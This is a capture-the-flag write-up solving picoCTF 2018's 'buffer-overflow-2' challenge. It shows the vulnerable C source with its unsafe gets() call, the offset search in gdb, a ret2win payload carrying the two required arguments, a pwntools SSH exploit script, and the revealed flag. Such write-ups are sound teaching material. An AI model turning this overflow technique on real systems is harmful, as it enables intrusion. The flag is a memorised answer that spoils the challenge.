
Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

<br/>

Connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
$ cd /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4/
```

<br/>

Now let's find the offset
I'll generate a cyclic pattern

```python
>>> from pwn import *
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```

Now open it on gdb and set a breakpoint before the programs exits

```bash
$ gdb vuln
$ disass main
0x080486b1 <+68>:    push   $0x80487d1
   0x080486b6 <+73>:    call   0x8048460 <puts@plt>
   0x080486bb <+78>:    add    $0x10,%esp
   0x080486be <+81>:    call   0x8048646 <vuln>
   0x080486c3 <+86>:    mov    $0x0,%eax
   0x080486c8 <+91>:    mov    -0x4(%ebp),%ecx
   0x080486cb <+94>:    leave  
   0x080486cc <+95>:    lea    -0x4(%ecx),%esp
   0x080486cf <+98>:    ret
(gdb) break *0x080486cf
(gdb) r
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
```

Now the offset is:

```python
>>> cyclic_find(0x62616164)
112
```

<br/>

Now get the address the win function

```bash
$ objdump -t vuln | grep win
080485cb g     F .text  0000007b              win
```

<br/>

Now let's use pwntools to pass the arguments to little endian

```python
>>> p32(0x080485cb)
b'\xcb\x85\x04\x08'
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> p32(0xdeadc0de)
b'\xde\xc0\xad\xde'
```

<br/>

Send the payload

```bash
$ echo $(python -c "print 'A'*112  + '\xcb\x85\x04\x08' 'BBBB' + '\xef\xbe\xad\xde' +  '\xde\xc0\xad\xde'") | ./vuln
picoCTF{addr3ss3s_ar3_3asyada28e9b}Segmentation fault (core dumped)
```

<br/>

Now the python script

```python
from pwn import *
import paramiko

user = 'yourusername'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4/ && ./vuln')

payload = b'a'*112
payload += p32(0x080485cb)
payload += b'bbbb'
payload += p32(0xdeadbeef)
payload += p32(0xdeadc0de)

p.recvuntil('Please enter your string:')
p.sendline(payload)
p.interactive()
```
